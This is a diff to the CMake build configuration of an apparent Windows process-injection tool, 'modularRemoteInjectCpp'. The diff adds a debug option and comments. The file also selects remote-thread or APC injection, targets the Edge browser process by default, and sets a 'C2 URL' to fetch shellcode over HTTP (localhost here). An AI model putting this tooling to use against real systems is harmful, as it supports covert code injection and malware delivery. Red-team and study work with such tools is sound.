@@ -14,6 +14,11 @@ option(USE_PROTECT_VPROTECT      "VirtualProtectEx"                   ON)
 option(USE_EXECUTE_REMOTE_THREAD "CreateRemoteThread execution"       ON)
 option(USE_EXECUTE_APC           "QueueUserAPC execution"             OFF)
 
+option(ENABLE_DEBUG "Enable debug output" ON)
+if(ENABLE_DEBUG)
+    target_compile_definitions(modularRemoteInjectCpp PRIVATE ENABLE_DEBUG)
+endif()
+
 macro(require_exactly_one PHASE)
     set(_count 0)
     foreach(_opt ${ARGN})
@@ -107,11 +112,13 @@ endif()
 
 target_link_libraries(modularRemoteInjectCpp PRIVATE ntdll kernel32)
 
+# Variable configuration
+# Target process
 set(INJECTION_TARGET "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" CACHE STRING "Target injection process")
 string(REPLACE "\\" "\\\\" INJECTION_TARGET_ESCAPED "${INJECTION_TARGET}")
-configure_file(cmake/config.h.in ${CMAKE_BINARY_DIR}/config.h)
-
+# C2 URL for shellcode fetching
 if(USE_SHELLCODE_FETCH_HTTP)
     set(SHELLCODE_HTTP_URL "http://127.0.0.1/shellcode.bin" CACHE STRING "Remote URL for shellcode")
-    configure_file(cmake/config.h.in ${CMAKE_BINARY_DIR}/config.h)
 endif()
+# Apply configuration
+configure_file(cmake/config.h.in ${CMAKE_BINARY_DIR}/config.h)
